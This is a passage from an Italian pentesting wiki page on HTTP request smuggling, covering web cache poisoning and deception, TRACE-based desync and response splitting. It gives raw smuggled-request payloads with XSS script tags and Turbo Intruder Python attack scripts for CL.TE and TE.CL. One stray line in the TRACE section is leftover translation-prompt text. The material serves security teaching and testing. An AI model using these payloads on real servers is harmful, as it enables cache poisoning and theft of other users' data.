Content-Length: 10

x=1
```
Nota la richiesta incorporata che punta a `/post/next?postId=3`. Questa richiesta verrà reindirizzata a `/post?postId=4`, utilizzando il **Host header value** per determinare il dominio. Modificando il **Host header**, l'attaccante può reindirizzare la richiesta al proprio dominio (**on-site redirect to open redirect**).

Dopo un riuscito **socket poisoning**, dovrebbe essere inviata una **GET request** per `/static/include.js`. Questa richiesta sarà contaminata dalla precedente richiesta **on-site redirect to open redirect** e recupererà il contenuto dello script controllato dall'attaccante.

Successivamente, qualsiasi richiesta per `/static/include.js` fornirà il contenuto memorizzato nella cache dello script dell'attaccante, lanciando efficacemente un ampio attacco XSS.

### Usare HTTP request smuggling per effettuare web cache deception <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **Qual è la differenza tra web cache poisoning e web cache deception?**
>
> - In **web cache poisoning**, l'attaccante fa sì che l'applicazione memorizzi del contenuto malevolo nella cache, e questo contenuto viene servito dalla cache ad altri utenti dell'applicazione.
> - In **web cache deception**, l'attaccante fa sì che l'applicazione memorizzi nella cache contenuti sensibili appartenenti a un altro utente, e poi l'attaccante recupera questo contenuto dalla cache.

L'attaccante crea una smuggled request che recupera contenuti sensibili specifici dell'utente. Considera il seguente esempio:
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
`` \ `0`\ ``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
Se questa smuggled request avvelena una cache entry destinata a static content (es., `/someimage.png`), i dati sensibili della vittima provenienti da `/private/messages` potrebbero essere memorizzati sotto la cache entry del static content. Di conseguenza, l'attaccante potrebbe potenzialmente recuperare questi cached sensitive data.

### Abuso di TRACE via HTTP Request Smuggling <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

[**In this post**](https://portswigger.net/research/trace-desync-attack) si suggerisce che se il server ha il metodo TRACE abilitato potrebbe essere possibile abusarne con un HTTP Request Smuggling. Questo perché questo metodo rifletterà qualsiasi header inviato al server come parte del body della response. Per esempio:
```
TRACE / HTTP/1.1
Host: example.com
XSS: <script>alert("TRACE")</script>
```
Per favore incolla il contenuto di src/pentesting-web/http-request-smuggling/README.md. Tradurrò il testo rilevante in italiano mantenendo intatta la sintassi markdown/HTML, i link, i tag e i percorsi.
```
HTTP/1.1 200 OK
Content-Type: message/http
Content-Length: 115

TRACE / HTTP/1.1
Host: vulnerable.com
XSS: <script>alert("TRACE")</script>
X-Forwarded-For: xxx.xxx.xxx.xxx
```
Un esempio di come abusare di questo comportamento sarebbe **smuggle prima una HEAD request**. A questa request verrà risposto solo con gli **headers** di una GET request (**`Content-Type`** tra questi). E smuggle **immediatamente dopo la HEAD una TRACE request**, che sarà **riflettente i dati inviati**.\
Poiché la risposta HEAD conterrà un header `Content-Length`, la **response della TRACE request verrà trattata come il body della risposta HEAD, quindi riflettendo dati arbitrari**.\
Questa response verrà inviata alla richiesta successiva sulla connessione, quindi questo potrebbe essere **usato in un file JS cache-ato per esempio per iniettare codice JS arbitrario**.

### Abuso di TRACE via HTTP Response Splitting <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Si suggerisce di continuare seguendo [**this post**](https://portswigger.net/research/trace-desync-attack) per un altro modo di abusare del metodo TRACE. Come commentato, smuggling una HEAD request e una TRACE request permette di **controllare alcuni dati riflessi** nella risposta alla HEAD request. La lunghezza del body della HEAD request è sostanzialmente indicata nell'header `Content-Length` ed è formata dalla response alla TRACE request.

Quindi, l'idea è che, conoscendo questo Content-Length e i dati forniti nella response della TRACE, sia possibile far sì che la response della TRACE contenga una valida HTTP response dopo l'ultimo byte indicato dal Content-Length, consentendo a un attaccante di controllare completamente la request per la risposta successiva (che potrebbe essere usata per eseguire un cache poisoning).

Example:
```
GET / HTTP/1.1
Host: example.com
Content-Length: 360

HEAD /smuggled HTTP/1.1
Host: example.com

POST /reflect HTTP/1.1
Host: example.com

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok\r\n
Content-Type: text/html\r\n
Cache-Control: max-age=1000000\r\n
Content-Length: 44\r\n
\r\n
<script>alert("response splitting")</script>
```
Genererà queste risposte (nota come la risposta HEAD ha un Content-Length che rende la risposta TRACE parte del body della HEAD e, una volta che il Content-Length della HEAD termina, una risposta HTTP valida viene smuggled):
```
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 165

HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 243

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok
Content-Type: text/html
Cache-Control: max-age=1000000
Content-Length: 50

<script>alert(“arbitrary response”)</script>
```
### Sfruttare HTTP Request Smuggling con HTTP Response Desynchronisation

Hai trovato una vulnerabilità di HTTP Request Smuggling e non sai come sfruttarla? Prova questi altri metodi di exploitation:


{{#ref}}
../http-response-smuggling-desync.md
{{#endref}}

### Altre tecniche di HTTP Request Smuggling

- Browser HTTP Request Smuggling (Client Side)


{{#ref}}
browser-http-request-smuggling.md
{{#endref}}

- Request Smuggling in HTTP/2 Downgrades


{{#ref}}
request-smuggling-in-http-2-downgrades.md
{{#endref}}

## Script Turbo intruder

### CL.TE

Da [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

Da: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## Strumenti

- HTTP Hacker (Burp BApp Store) – visualizzare concatenazione/framing e comportamento HTTP a basso livello
- https://github.com/PortSwigger/bambdas/blob/main/CustomAction/SmugglingOrPipelining.bambda Burp Repeater Custom Action "Smuggling or pipelining?"
- [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
- [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
- [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
- [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
- [https://github.com/Moopinger/smugglefuzz](https://github.com/Moopinger/smugglefuzz)
- [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): Questo tool è un grammar-based HTTP Fuzzer utile per trovare strane discrepanze di request smuggling.

## Riferimenti

- [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
- [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
- [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
- [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
- [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
- [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
- [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)
- [https://portswigger.net/research/trace-desync-attack](https://portswigger.net/research/trace-desync-attack)
- [https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)
- Attenzione ai falsi falsi‑positivi: come distinguere HTTP pipelining da request smuggling – [https://portswigger.net/research/how-to-distinguish-http-pipelining-from-request-smuggling](https://portswigger.net/research/how-to-distinguish-http-pipelining-from-request-smuggling)
- [https://http1mustdie.com/](https://http1mustdie.com/)
- Browser‑Powered Desync Attacks – [https://portswigger.net/research/browser-powered-desync-attacks](https://portswigger.net/research/browser-powered-desync-attacks)
- PortSwigger Academy – client‑side desync – [https://portswigger.net/web-security/request-smuggling/browser/client-side-desync](https://portswigger.net/web-security/request-smuggling/browser/client-side-desync)
- [https://portswigger.net/research/http1-must-die](https://portswigger.net/research/http1-must-die)


{{#include ../../banners/hacktricks-training.md}}
